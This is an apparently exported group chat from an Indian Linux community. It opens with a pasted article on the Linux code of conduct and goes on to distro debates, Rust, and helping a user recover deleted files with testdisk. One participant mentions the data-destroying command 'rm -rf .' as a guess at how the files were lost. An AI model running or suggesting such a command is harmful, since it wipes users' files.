Raghav,,Rwbhu,"ra got her first taste of programming as a six-year-old, living with her parents in New Mexico. Her mother was the one interested in computers; she bought an IBM PCjr and taught her daughter the¬†basicprogramming language. At the age of twelve, Aurora‚Äôs family moved to a ranch. ‚ÄúI would write a computer program and then go milk the goats,‚Äù Aurora recalled. She first encountered Linux at the New Mexico Institute of Mining and Technology. Around 2000, when her first fix to Linux was accepted, she threw a party. A couple of years later, she published¬†an online manual, ‚ÄúHOWTO Encourage Women in Linux,‚Äù which included chapters named ‚ÄúDon‚Äôt criticize too much,‚Äù ‚ÄúDo compliment,‚Äù and ‚ÄúDon‚Äôt stare and point when women arrive.‚Äù Aurora told me that she was groped at a Linux conference and that a senior administrator belittled her and told she lacked the talent to be a key developer. It never occurred to her to report the groping, she said. In 2007, Aurora began to withdraw from Linux programming. She is now a consultant to tech companies working on issues of inclusion and diversity.

Many women who contribute to Linux point to another open-source project, Python, as a guide for Linux as its faces its #MeToo moment. Guido van Rossum, a white, male programmer from the Netherlands, invented the code for the Python programming language. Van Rossum, though, is a self-described feminist who often wears a ‚ÄúPython Is for Girls‚Äù T-shirt during his keynote addresses to Python coders. ‚ÄúA project attracts people who fit in the culture,‚Äù van Rossum told me, adding that if the leaders communicate abusively ‚Äúit will attract people who either share that attitude, or at least don‚Äôt see a problem with it.‚Äù Van Rossum, who now lives in the Bay Area, said the Python community shows that the number of women working on open-source software projects can be increased. ‚ÄúI‚Äôm applying my feminist ideas or inclinations to a place where I naturally have some influence,‚Äù he said.

Mariatta Wijaya, a software engineer who was born in Indonesia and now lives and works in Vancouver, said that she attended her first Python conference in 2015, in Montreal, out of curiosity. During van Rossum‚Äôs keynote address, he admitted that there were no women among its core developers. ‚ÄúHe said he was willing to mentor women personally, if that is what it takes to improve the diversity,‚Äù Wijaya recalled, ‚Äúbut I didn‚Äôt reach out to him.‚Äù The next year, she attended the same conference. ‚ÄúHe gave another keynote and admitted that there were still no women,‚Äù she recalled, and made his same offer of mentorship. This time, Wijaya contacted van Rossum and he agreed to help. A year later, Wijaya became the first woman with core-developer privileges, which gives her the power to help decide how Python will grow and change.

Today, there are four women among roughly ninety Python core developers. This summer, van Rossum announced he would be stepping down as Python‚Äôs ‚Äúbenevolent dictator.‚Äù ‚ÄúI am not going to appoint a successor,‚Äù he wrote in a¬†public e-mail. ‚ÄúSo what are you all going to do? Create a democracy? Anarchy? A dictatorship?¬†A federation?‚Äù

Torvalds, by contrast, long resisted the idea that the Linux programming team needed to become more diverse, just as he resisted calls to tone down his language. In 2015, Sharp advocated for a first-ever code of conduct for Linux developers. At a minimum, they hoped for a code that would ban doxxing‚Äîthe releasing of personal information online to foment harassment‚Äîand threats of violence in the community. Instead, Torvalds accepted a programming fix provocatively titled ‚ÄúCode of Conflict,‚Äù which created a mechanism for filing complaints more generally. In the three years since then, no developers have been disciplined for abusive comments. Sharp, who was employed by Intel at the time, said they carefully avoided Linux kernel work thereafter.

Torvalds‚Äôs post on Sunday was a hodgepodge of apology, updates about the kernel, and coding changes that had been approved. He joked that perhaps he could find a technical fix for his bad behavior‚Äî‚ÄúMaybe",1537530837
Raghav,,Rwbhu,"I can get an e-mail filter in place so at[sic] when I send e-mail with curse-words, they just won‚Äôt go out.‚Äù‚Äîbefore acknowledging that after he looks in the mirror, ‚Äúit will be clear it‚Äôs not the only change that has to happen.‚Äù Buried within the list of approved patches was one titled ‚ÄúCode of Conduct: Let‚Äôs Revamp It.‚Äù It announced that the ‚ÄúCode of Conflict‚Äù had been replaced by a ‚ÄúCode of Conduct‚Äù that forbids ‚Äúinsulting/derogatory comments‚Äù and behavior ‚Äúconsidered inappropriate in a professional setting.‚Äù Complaints will be heard by the foundation‚Äôs technical-advisory board, which has ten members, all men.

Swarnim,Arun,Minraws,And it won't work outside of steam as far as I know,1537887288

Swarnim,Arun,Minraws,Where will that come from,1537887810
Swarnim,Arun,Minraws,Cause most Linux folks are on a tight budget and even if not there are so few of them to make donations for massive projects like this,1537887855
nly,,muhfreedom,I don't worry about how valve can make money.,1537887875
Swarnim,Arun,Minraws,And this is by far the worst way to have gaming on Linux,1537887876

Swarnim,Arun,Minraws,It only works with steam play afaik,1537888578
Swarnim,Arun,Minraws,And it can't be shared or modified for distribution so it's not very open source,1537888616
Swarnim,Arun,Minraws,You can only see the source code,1537888628

Kuntal,M,hellozee,kya?,1537888811
Swarnim,Arun,Minraws,Please go and read the license,1537888839
Kuntal,M,hellozee,valve cannot do this,1537888853
Swarnim,Arun,Minraws,Uhm why?,1537888874
Kuntal,M,hellozee,https://github.com/ValveSoftware/Proton/blob/proton_3.7/LICENSE.proton,1537888878
nly,,muhfreedom,Yeah its not MIT but custom valve license,1537888895
nly,,muhfreedom,complicated actually,1537888937
Swarnim,Arun,Minraws,It can only be shared with the license applied it like an extreme version of copy left,1537888945
Kuntal,M,hellozee,look at the dependencies,1537888946
Swarnim,Arun,Minraws,That's the loop hole they tapped I would say.,1537888968
nly,,muhfreedom,Anyway I wouldn't bother with this,1537889151
Kuntal,M,hellozee,It can be modified and shared we just need to keep the license,1537889151
Kuntal,M,hellozee,What loophole?,1537889163
Swarnim,Arun,Minraws,Like I said the loop hole is that only part of the system needs to be open source the part that depends on other open source code or is modified version of it.,1537889232
Swarnim,Arun,Minraws,But proton also needs steam to function,1537889245
Swarnim,Arun,Minraws,That means they just locked there code without locking it,1537889258
Manas,kashyap,reflect0r,Whats going on guys?,1537889296
Kuntal,M,hellozee,"Wait for sometime, someone will come up with something, that is open source for you",1537889310
Swarnim,Arun,Minraws,"If you know your way around you can obviously build it for non steam use but it also uses some features from there will be a pain to do.

But if I know the community they will do it.",1537889318
Swarnim,Arun,Minraws,I want Games to actually be made for Linux,1537889339
Manas,kashyap,reflect0r,Start and develop some,1537889353
Swarnim,Arun,Minraws,Most game engines can export to Linux already but no one makes them. Sad really.,1537889373
Swarnim,Arun,Minraws,I have made a few but only for Game Jams,1537889387
Swarnim,Arun,Minraws,In my last one I got 4 place in ~150 entries world wide,1537889412
Kuntal,M,hellozee,Increased maintainence,1537889414
Swarnim,Arun,Minraws,That's the prob,1537889431
Kuntal,M,hellozee,Which game engine do ya use?,1537889440
Swarnim,Arun,Minraws,But the problem is maintainence without benefits,1537889446
Swarnim,Arun,Minraws,Linux as per steam is only 0.59%,1537889465
Swarnim,Arun,Minraws,User base,1537889469
Swarnim,Arun,Minraws,That one was in Godot Engine it's like Unity but FOSS and better,1537889490
Kuntal,M,hellozee,ohh don't know why I never liked GDScript,1537889517
Swarnim,Arun,Minraws,I also work on its development fixing UI issues and all in free time. :),1537889518
Swarnim,Arun,Minraws,It supports C# too now,1537889533
Swarnim,Arun,Minraws,And you can always use GDNative to write code in C++ or any language you like,1537889564
Kuntal,M,hellozee,That is too much of work when you have SDL2,1537889613
Swarnim,Arun,Minraws,GDNative is easier to setup and use than SDL2,1537889689

Satyakam,Goswami,Satyaakam,Yeah mostly it's rehash of same stuff but yeah I feel them all,1537979535
Manas,kashyap,reflect0r,Because 1) Its a foss project 2) I find people developing it is in this community and i can meet them physically amd discuss things 3) i like doing it. 4) Whats bad in using a new distro?,1537979559
Srihari,Unnikrishnan,arcsaber,proud to have you in the meme police,1537979564

Srihari,Unnikrishnan,arcsaber,exactly,1537979639
Harsh,Spookdilya,MSFJarvis,It's pretty clear people here don't see what you see in hamara,1537979640
Harsh,Spookdilya,MSFJarvis,Website wound like a long boring story to the point that full page in I still can't tell what is the base distro for packages,1537979681
Manas,kashyap,reflect0r,"Yeah its upto. U, so please don't tell people your view.",1537979696
Satyakam,Goswami,Satyaakam,Guys you nailed it Foss is actually about choice and one cannot enforce it on others,1537979704
Satyakam,Goswami,Satyaakam,Why?,1537979714
Srihari,Unnikrishnan,arcsaber,you literally plugged your OS to me,1537979725
Manas,kashyap,reflect0r,Debian testing,1537979730
Harsh,Spookdilya,MSFJarvis,Aren't you telling people your view by suggesting Hamara is better than Arch and Mint lmao,1537979731
Manas,kashyap,reflect0r,No i am saying just try hamara,1537979743
Manas,kashyap,reflect0r,Lemme repharse it,1537979755
Satyakam,Goswami,Satyaakam,Selling is ok overselling is bad :-p,1537979774
Harsh,Spookdilya,MSFJarvis,How hard would it have been to put relevant information like that on the front page rather than the philosophical blather,1537979793
Satyakam,Goswami,Satyaakam,Enforcement is wrose,1537979794
Swarnim,Arun,Minraws,"If I had a say in the matter I would really like to see projects like Solus or elementary from India.

Something with newer design and features that adds to functionality.

Probably something that redefines something or does something totally new, Hamara is like a Indian version of Debian. 

Not that it's bad but not enough to be worth installing for me.",1537979840
Manas,kashyap,reflect0r,Okay sorry,1537979874
Satyakam,Goswami,Satyaakam,Hope you know history and Indlinux project,1537979900
Srihari,Unnikrishnan,arcsaber,"but time and time again
FOSS doesnt care about your nationality",1537979948
Srihari,Unnikrishnan,arcsaber,code is independent,1537979954
Swarnim,Arun,Minraws,"Yes it doesn't I just mean some people from India start it, but the world can help with it.

We don't need a nation specific OS.

Just something that puts India also on the map of Innovative developers.",1537980045
Srihari,Unnikrishnan,arcsaber,does it matter if indians or martians made it.,1537980072
Swarnim,Arun,Minraws,Indlinux wasn't that a Hindi Linux?,1537980073
Satyakam,Goswami,Satyaakam,No need for sorry just be aware and don't try to enforce your values and beliefs on others,1537980085
Srihari,Unnikrishnan,arcsaber,Well if it does to you then go ahead,1537980088
Satyakam,Goswami,Satyaakam,Much more check. There project page,1537980137
Satyakam,Goswami,Satyaakam,Because it does not belong to anyone,1537980184
Srihari,Unnikrishnan,arcsaber,exactly,1537980192
Satyakam,Goswami,Satyaakam,On the contrary it belongs to everyone,1537980204
Satyakam,Goswami,Satyaakam,It's upto you how you feel,1537980224
Swarnim,Arun,Minraws,"Nope it doesn't but I want to see the indian creativity too.... 
We are like the most budget conscious people in the world, we have strong beliefs and good ideas. 
ISRO proves that.
That turning into a distro will be fun to watch.
I probably will try, fail I might, but it's fun to code and make. üòÑ",1537980263
Satyakam,Goswami,Satyaakam,It's just like human emotions at play,1537980276
Satyakam,Goswami,Satyaakam,For example One may feel very strong about LGBT community others may be laughing at even the idea,1537980318
Satyakam,Goswami,Satyaakam,So I consider Foss world to be more democratic than many democracies of this world,1537980388
Swarnim,Arun,Minraws,"FOSS is more like a World Building game. Than a real democracy.

You can do anything and not need to care about other people's opinions.",1537980458
Raman,Tehlan,ramantehlan,+1,1537980469
Satyakam,Goswami,Satyaakam,Yes go ahead and do it with your time if anyone likes it they will follow,1537980489
Srihari,Unnikrishnan,arcsaber,alright guys i gotta sleep now its been great having this debate,1537980498
Swarnim,Arun,Minraws,But others can use their opinions to make something new with you. üòÑ,1537980507

Swarnim,Arun,Minraws,Yeah I am looking into making a Desktop Environment. At the moment.,1537980709
Satyakam,Goswami,Satyaakam,I have strong opinions about them but for now I will keep them to myself :-),1537980757
Swarnim,Arun,Minraws,"Feel free to share I am all üëÇ, inam thinking a lightweight modern but minimal something.",1537980825
Swarnim,Arun,Minraws,It's very vague at the moment,1537980836
Satyakam,Goswami,Satyaakam,Write about it in a blog and share will comment then,1537981287
Aakash,Saini,,"It‚Äôs been many years, but I still remember working with MCIT & TDIL (Min. Of Comm & IT) . 
We did lot of work on Indian Language projects along with CDAC/MCIT-IIT/R and many other institutes were involved.

Remembering worked on Translation & TransLiteration along with IIT/K, CDAC.

Further more I remember working with Mark Davis from Unicode Consortia to bring Indian language fonts to Unicode. Back days I remember we needed GIST/iLeap to work on Indian Languages.

There were 2
Standards: ISCII & ISFOC, iscii was keyboard engine standard for Indian languages and isfoc was font standard.

Sanskrit is mother of all Indian languages, where each Indian language resemble same letter as of Sanskrit with different regional glyphs and regional pronunciation.

We also worked on localization of OS. I don‚Äôt suppose the OS copy is anymore available; checkout IndusOS. I think I remember the team, it‚Äôs be more than 15yrs now!!

I ported lot of work to unix & Linux back then!!

Just saw your localization conversation above, so thought to update links from old memory!

Check out link OS in Indian language & other technologies.

Satyakam,Goswami,Satyaakam,Transiteration I meant,1537985390
Aakash,Saini,,"Greatüëç. I work with Dr. Anil & Dr. Sinha from IITK on translation.

I wrote complete email based on RFC in perl which supported transliteration and we deployed at CDAC noida.  Back many years üòã",1537985495

Satyakam,Goswami,Satyaakam,Work in isolation,1537985742
Aakash,Saini,,Yes. The entire work is now embedded in OS itself as Unicode.,1537985797
Satyakam,Goswami,Satyaakam,Yeah those were fun times just like the Unix wars between iscii and Isfoc as standards then unicode gobbled them,1537985991

vi/Unix and emacs!

3. And I use both debugger and profiler quite a bit, mostly to learn, I probably don't know how industry professionals use it.
I have tried to use FOSS debuggers for C++ but they aren't ever as polished as Visual Studio's.

Also intellisense is not Microsoft specific it is not hard to implement with all the language servers being so easy to use. Still intellisense is just a lot more polished in the heavier IDEs like Visual Studio and CLion.",1538195829

Say 13th or 14th October?
This way, people who are willing to contribute can get a kick start and others get a lovely environment and atmosphere to work in.

P.S. Not to forget, the stats for the poll were very high, that is, they wanted to have it and were extremely interested. 
We also had this discussion in the PyDelhi meetup and got a good amount of response for the same.",1538405324

Chaitanya,Arora,Chaitanyaarora,,1538461284
Swarnim,Arun,Minraws,The compiler of rust is really smart and the best feature of rust. Overall.,1538461432
Swarnim,Arun,Minraws,And there is no println function in rust there is rather a Macro for the purpose.,1538461639
Srihari,Unnikrishnan,arcsaber,its println!,1538470715
Swarnim,Arun,Minraws,"Yep that's the macro for printing stuff.

Rust has a sort of convention of naming macros with a postfix of !",1538471320
Swarnim,Arun,Minraws,Really makes it easier to see what is a macro and what's not.,1538471341
Swarnim,Arun,Minraws,You can use various traits to use the Macro println!,1538471365
Swarnim,Arun,Minraws,The awesome thing is that anything with a debug trait implementation can be printed using the macro,1538471484
Kuntal,M,hellozee,so does c++ if you write the wrong constructor,1538471486
Swarnim,Arun,Minraws,Difference is that Rust does it for everything. Although these helpers can be stopped if you so desire.,1538471840
Kuntal,M,hellozee,Any class with an overloaded << friend function will do the job for c++,1538471904

Kuntal,M,hellozee,it should sound okayish now,1538472085

Swarnim,Arun,Minraws,True but that's just an example. üòú,1538472188

Swarnim,Arun,Minraws,But it's not everyone's cup of tea that non OOP really bugs some people out.,1538472297

Shivam,,g33kyshivam,It was a mozilla iris project,1539439640
Manas,kashyap,reflect0r,link would be great,1539439650
Manas,kashyap,reflect0r,and what u did ?,1539439653
cocoa,,cocoa1231,TL;DR of what happened here?,1539439671
cocoa,,cocoa1231,Did someone ask him to do rm -rf .?,1539439685
cocoa,,cocoa1231,In his home directory?,1539439692
Pikachu,,pikaapikaaa,And he did it?,1539439705
Manas,kashyap,reflect0r,nope the space is occupied,1539439709
Pikachu,,pikaapikaaa,In his home directory?,1539439710
Manas,kashyap,reflect0r,only,1539439711
cocoa,,cocoa1231,I suspect so,1539439715
Shivam,,g33kyshivam,Naa i didn't type that command,1539439732
Srihari,Unnikrishnan,arcsaber,disk space is there,1539439745
cocoa,,cocoa1231,"Okay, can you tell me the problem?",1539439759
cocoa,,cocoa1231,The doctor is in,1539439783
Shivam,,g33kyshivam,"Look , all of my files are gone. Even google chrome downloaded history shows file deleted",1539439800
Srihari,Unnikrishnan,arcsaber,ooh can be your partner,1539439803
Shivam,,g33kyshivam,,1539439819
Srihari,Unnikrishnan,arcsaber,So can you just try and rememver your commands,1539439833
cocoa,,cocoa1231,"Okay, first things first, stop using your drive immediately",1539439843
Shivam,,g33kyshivam,And here is the output of df command,1539439862
Shivam,,g33kyshivam,,1539439874
cocoa,,cocoa1231,"The way deletion works is that the area of the disk where the files lived is marked as free, and then if other data needs to, it is overridden",1539439880
Manas,kashyap,reflect0r,well cocoa see there are 2 users,1539439887
cocoa,,cocoa1231,So you need to stop using this computer,1539439894
Manas,kashyap,reflect0r,so might be the case that he is in different user ?,1539439897
cocoa,,cocoa1231,Same user different TTYs,1539439912
Shivam,,g33kyshivam,i already did a restart,1539439919
Shivam,,g33kyshivam,üôÑüôÑ,1539439928
cocoa,,cocoa1231,"Some data might be corrupted, but let's see what we can recover.",1539439940
Srihari,Unnikrishnan,arcsaber,Live boot,1539439944
Srihari,Unnikrishnan,arcsaber,Using a pendrive,1539439961
Manas,kashyap,reflect0r,well so the thing is things are gone ?,1539439970
cocoa,,cocoa1231,"I am not aware of the exact steps, but download a program called testdisk in a live environment that is not your hard drive",1539439978
cocoa,,cocoa1231,Whatever was sequentially first,1539439988
cocoa,,cocoa1231,So like a USB,1539439995
Srihari,Unnikrishnan,arcsaber,Live envs like your pendrive  @g33kyshivam,1539440001
cocoa,,cocoa1231,Do you have any other machine available to make a live USB?,1539440029
Shivam,,g33kyshivam,"Okay, So I first make a bootable pendrive then using that I install testdisk",1539440045
Shivam,,g33kyshivam,Yes,1539440059
cocoa,,cocoa1231,"Cool, make a bootable USB",1539440075
Srihari,Unnikrishnan,arcsaber,Seems like that,1539440077
cocoa,,cocoa1231,In the live boot install testdisk,1539440084
Shivam,,g33kyshivam,Give me 10 mins,1539440111
cocoa,,cocoa1231,"Sure. In the meantime, imma google how to use test disk",1539440126
cocoa,,cocoa1231,:P,1539440128
Shivam,,g33kyshivam,But can you explain me the df output,1539440144
Shivam,,g33kyshivam,How is it showing 98% used??,1539440155
Shivam,,g33kyshivam,This,1539440176
Shivam,,g33kyshivam,This too,1539440196
Srihari,Unnikrishnan,arcsaber,Thats why we check your disk,1539440212
Srihari,Unnikrishnan,arcsaber,To check for screw ups,1539440224
Srihari,Unnikrishnan,arcsaber,I had a problem like this once. Quite a lot of people suggested ‚Üí https://www.runtime.org/data-recovery-live-cd.htm,1539440259
Srihari,Unnikrishnan,arcsaber,Never tried it,1539440279
cocoa,,cocoa1231,We will mount that partition in read only mode and look at it,1539440326
cocoa,,cocoa1231,But first let's recover the files eh?,1539440338
Shivam,,g33kyshivam,Sure just creating a bootable live ubuntu,1539440376
Shivam,,g33kyshivam,Ok im in the live boot,1539440676
Shivam,,g33kyshivam,,1539440692
Shivam,,g33kyshivam,@cocoa1231 @arcsaber,1539440709

cocoa,,cocoa1231,Open up an app called software sources,1539440778
cocoa,,cocoa1231,I this it's still called that,1539440787
cocoa,,cocoa1231,"And tick all the repositories that are there. Universe, multiverse etc.",1539440808
cocoa,,cocoa1231,"And when you try to close it, it should ask to update software cache or something like that, do it, wait for it, and the try to install testdisk",1539440835
Shivam,,g33kyshivam,Okay,1539440849
Shivam,,g33kyshivam,Done,1539440860
Shivam,,g33kyshivam,What next,1539440878
cocoa,,cocoa1231,Do you also have an external drive to put the recovered files into?,1539440890
cocoa,,cocoa1231,Because you can't write to your hard disk while you're recovering,1539440906
Shivam,,g33kyshivam,My whole HDD got deleted t,1539440938
cocoa,,cocoa1231,"If all went well, sudo apt install testdisk should work",1539440938

Shivam,,g33kyshivam,I have,1539440973
Shivam,,g33kyshivam,I have some backup already stored in thay,1539440985
cocoa,,cocoa1231,Your whole internal hard drive couldn't have gotten deleted. You were running your OS just now. Its still got stuff on it,1539440993
cocoa,,cocoa1231,Sure. As long as you gave enough space,1539441005
cocoa,,cocoa1231,Launch testdisk by just typing in testdisk,1539441021
cocoa,,cocoa1231,"Oh wait, maybe it is sudo testdisk",1539441034
Shivam,,g33kyshivam,,1539441036
Shivam,,g33kyshivam,Now,1539441059
cocoa,,cocoa1231,Press Ctrl+c and exit out of it,1539441068
cocoa,,cocoa1231,Type in sudo testdisk,1539441076

cocoa,,cocoa1231,"Sweet, press colon ( : ) to select the files, and press c to recover them
BUT plug in your external drive right now if you haven't already",1539442221
Shivam,,g33kyshivam,i told you i didn't run thr rm -rf command,1539442230
cocoa,,cocoa1231,I feel so professional,1539442230
Srihari,Unnikrishnan,arcsaber,Extra BTCs,1539442247
Shivam,,g33kyshivam,Is this not possible to recovery in the same disk,1539442283
cocoa,,cocoa1231,"No, because that'll require writing",1539442293
cocoa,,cocoa1231,To the target,1539442299
Shivam,,g33kyshivam,I mean my entire home directory files got hidden,1539442304
cocoa,,cocoa1231,Which will override the data you're trying to recover,1539442306
Shivam,,g33kyshivam,"Ok , can you check is there amy other alternative to this",1539442337
Shivam,,g33kyshivam,I mean the files were not deleted,1539442355
cocoa,,cocoa1231,Why? I thought you had an external drive?,1539442359
cocoa,,cocoa1231,"Yes they were. If they're in red, then they were",1539442369
cocoa,,cocoa1231,Otherwise you would have been able to see them by just doing ls -l,1539442378

Srihari,Unnikrishnan,arcsaber,Umm wow,1539442414
cocoa,,cocoa1231,You won't find anything named DISK_IMG. You have to specify something like /dev/sdXY,1539442441
Shivam,,g33kyshivam,So i have to take my imp files now,1539442479
Manas,kashyap,reflect0r,nah nothing is there,1539442491

cocoa,,cocoa1231,"it's identified as /dev/sdXY where X, Y are whole numbers",1539442594
cocoa,,cocoa1231,"Wait, Y is",1539442600

Srihari,Unnikrishnan,arcsaber,can anyone tell me why mint use py 2.7  by default,1540135395
cocoa,,cocoa1231,Debian does,1540135472
Srihari,Unnikrishnan,arcsaber,ah,1540135480
Manas,kashyap,reflect0r,agreed,1540135485
Harsh,Spookdilya,MSFJarvis,step 1 to using things with Ubuntu package base: Don't ask why it's out of date and just install the latest for yourself,1540135501
Manas,kashyap,reflect0r,"well not in this release but in next release of debian 11 , we might use py 3 as default",1540135509
Srihari,Unnikrishnan,arcsaber,lels,1540135515
cocoa,,cocoa1231,"Step 2, install sid",1540135518
Manas,kashyap,reflect0r,debian package base,1540135522
Manas,kashyap,reflect0r,"agreed , u are going on right path",1540135530
Harsh,Spookdilya,MSFJarvis,Would rather install Windows,1540135539
Srihari,Unnikrishnan,arcsaber,would rather install Gentoo,1540135557
Manas,kashyap,reflect0r,why so ?,1540135572
Harsh,Spookdilya,MSFJarvis,cuz install is all you'll be doing with gentoo at any rate,1540135574
Manas,kashyap,reflect0r,,1540135595
Manas,kashyap,reflect0r,https://www.python.org/dev/peps/pep-0394/,1540135608
Harsh,Spookdilya,MSFJarvis,I use Mint because I don't want to muck around getting things working. Good luck getting any recent hardware working on Debian's garbage kernel,1540135618
Manas,kashyap,reflect0r,"what ?? garbage kernel how can u say that , just asking what issues u faced ?",1540135706
Harsh,Spookdilya,MSFJarvis,Right up till kernel 4.18 the Vega 8 on my laptop does not work with Linux. The trackpad is also dysfunctional. Backporting DRM from 4.19 RC8 to kernel 3.2 is something I'd rather not wish on anybody,1540135867
Srihari,Unnikrishnan,arcsaber,use manjaro,1540135946
Harsh,Spookdilya,MSFJarvis,apt muscle memory,1540135978
Srihari,Unnikrishnan,arcsaber,lels,1540135985

Harsh,Spookdilya,MSFJarvis,,1540136804
Kuntal,M,hellozee,bad joke then,1540136824
Srihari,Unnikrishnan,arcsaber,he meant its tough,1540136838
Harsh,Spookdilya,MSFJarvis,You're just too religious about it,1540136852
Srihari,Unnikrishnan,arcsaber,and time consuming,1540136852
Kuntal,M,hellozee,"nup, you just need to follow the wiki",1540136854
Srihari,Unnikrishnan,arcsaber,.,1540136860
Kuntal,M,hellozee,the installation guide of gentoo is far better than arch's,1540136877
Harsh,Spookdilya,MSFJarvis,Don't even need the Wiki > need the Wiki to not fuck up beyond help,1540136889
Piyush,Aggarwal,brute4s99,Agreed :(,1540136903
Kuntal,M,hellozee,"nope, you can install gentoo without even restarting",1540136908
Kuntal,M,hellozee,like you can with most of the distros,1540136921
Srihari,Unnikrishnan,arcsaber,ask me if I give a shit,1540136922
Harsh,Spookdilya,MSFJarvis,Idk about the installation guide but Wiki definitely is nicer,1540136923

Harsh,Spookdilya,MSFJarvis,"or 2.6, I haven't kept up with Ben Hutchings' linux-stable work",1540137030
Harsh,Spookdilya,MSFJarvis,he's always maintaining ancient kernels for Debian,1540137042
.,,rajudev,What are you  trying to say here? beyond spooking,1540137079
Harsh,Spookdilya,MSFJarvis,3.16 now I guess,1540137095
Kuntal,M,hellozee,Is this another joke?,1540137139
Harsh,Spookdilya,MSFJarvis,It's impossible to get any recent hardware to work on Debian's kernel,1540137149
Harsh,Spookdilya,MSFJarvis,the input series that I need for my ELAN touchpad will never apply to 3.16 and the backport effort is simply not worth it,1540137196
.,,rajudev,now you are talking. Previously you were just spooking with half /no latest info,1540137197
cocoa,,cocoa1231,I use an i3 6006U dude. I can't have a compilation and firefox running side by side,1540137212
.,,rajudev,and debian stable has 4.9 not the 3.x series you are continuously mentioning,1540137227
Kuntal,M,hellozee,you can,1540137236
.,,rajudev,also debian unstable/sid has 4.18,1540137246
Harsh,Spookdilya,MSFJarvis,"said the same thing there, just included one subsystem that's always the major problem",1540137251
cocoa,,cocoa1231,Its dual core hyperthreaded. I'm not putting that much load on it at once,1540137275
.,,rajudev,"If you just want to spook, go ahead. but you are providing the wrong info.",1540137286
cocoa,,cocoa1231,It chugs and sometimes grinds to a halt,1540137286
Harsh,Spookdilya,MSFJarvis,ouch,1540137292
Harsh,Spookdilya,MSFJarvis,Very relatable,1540137306
cocoa,,cocoa1231,"Yeah, I'll take my packages pre compiled, thank you",1540137319
.,,rajudev,and FYI debian supports most hardware/processor architectures than anyone else out there.,1540137333
Ayan,Pahwa,cli_ninja,we had a community call @9??,1540137341
Ayan,Pahwa,cli_ninja,*HAD*,1540137348
Kuntal,M,hellozee,just set a single core for portage and use the other for firefox,1540137350
cocoa,,cocoa1231,,1540137352
Harsh,Spookdilya,MSFJarvis,I mean I'm not averse to compiling things for myself but everything is a bit of a stretch,1540137352
cocoa,,cocoa1231,compilation sloooows down so much...,1540137374
Kuntal,M,hellozee,"gentoo has binary packges, there too",1540137381
cocoa,,cocoa1231,"Yeah, exactly",1540137384
cocoa,,cocoa1231,But then what's the point of it?,1540137392
Harsh,Spookdilya,MSFJarvis,I build my own kernel and git among other stuff but kill me if I need to compile the DE and shit too,1540137394
Ayan,Pahwa,cli_ninja,+1 debian has best portability,1540137397
Ayan,Pahwa,cli_ninja,as well,1540137405
Kuntal,M,hellozee,You just install binary packages of those which take too much time like firefox,1540137431
Harsh,Spookdilya,MSFJarvis,or Chromium,1540137456
Kuntal,M,hellozee,"compiling DE is not that much, but the programs which come with it are",1540137458
cocoa,,cocoa1231,But I can do that with arch too. I just use the PKGBUILDS for the packages I want to buold,1540137459
Harsh,Spookdilya,MSFJarvis,which doesn't take time,1540137460
Harsh,Spookdilya,MSFJarvis,takes an eternity,1540137465
cocoa,,cocoa1231,Like telegram,1540137466
.,,rajudev,"also I get the fact that Mint works for you and Debian does not, fine. Whatever floats the boat. But your reasons for hate are not correct.",1540137466
Harsh,Spookdilya,MSFJarvis,and a server farm,1540137467
Kuntal,M,hellozee,Then you don't have portage,1540137478

cocoa,,cocoa1231,I'm fine with that :P,1540137516
